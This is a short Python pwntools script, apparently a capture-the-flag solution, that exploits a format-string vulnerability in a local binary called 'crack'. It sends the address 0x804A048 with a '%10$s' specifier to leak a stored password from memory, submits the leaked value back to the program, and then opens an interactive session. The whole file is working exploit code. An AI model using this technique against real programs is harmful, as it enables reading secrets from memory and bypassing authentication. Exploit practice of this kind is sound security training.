#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

pwdAddr = 0x804A048
payload = p32(pwdAddr) + "|%10$s||"

io = process("./crack")
io.sendlineafter(" ? ", payload)
io.recvuntil("|")
leaked = u32(io.recvuntil("||", drop = True))
io.sendlineafter(" :", str(leaked))

io.interactive()
io.close()
